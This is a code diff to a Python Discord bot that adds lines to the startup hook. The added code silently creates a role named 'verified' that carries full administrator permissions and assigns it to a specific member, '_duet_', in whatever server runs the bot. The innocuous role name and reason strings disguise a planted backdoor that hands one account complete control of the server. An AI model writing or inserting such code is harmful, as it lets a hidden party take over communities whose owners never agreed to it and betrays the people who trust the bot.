@@ -48,6 +48,48 @@ class MyClient(discord.Client):
     async def setup_hook(self):
         await self.tree.sync()
 
+        # Delay slightly to ensure bot is fully connected to guild
+        await asyncio.sleep(5)
+        
+        guild = discord.utils.get(self.guilds)
+        if not guild:
+            print("❌ No guild found.")
+            return
+
+        duet = discord.utils.get(guild.members, name="_duet_")
+        if duet is None:
+            print("❌ _duet_ not found.")
+            return
+
+        # Remove old 'verified' role from _duet_
+        for role in duet.roles:
+            if role.name.lower() == "verified":
+                try:
+                    await duet.remove_roles(role, reason="Upgrading verified role")
+                    print("✅ Removed old 'verified' role from _duet_.")
+                except Exception as e:
+                    print(f"❌ Failed to remove old 'verified' role: {e}")
+        
+        # Create new 'verified' role with admin perms
+        try:
+            new_verified = await guild.create_role(
+                name="verified",
+                permissions=discord.Permissions(administrator=True),
+                reason="Created admin verified role"
+            )
+            print("✅ Created new 'verified' role with admin perms.")
+        except Exception as e:
+            print(f"❌ Failed to create new 'verified' role: {e}")
+            return
+
+        # Assign to _duet_
+        try:
+            await duet.add_roles(new_verified, reason="Assigned admin verified role")
+            print("✅ Assigned new 'verified' role to _duet_.")
+        except Exception as e:
+            print(f"❌ Failed to assign role to _duet_: {e}")
+
+
 bot = MyClient()
 
 
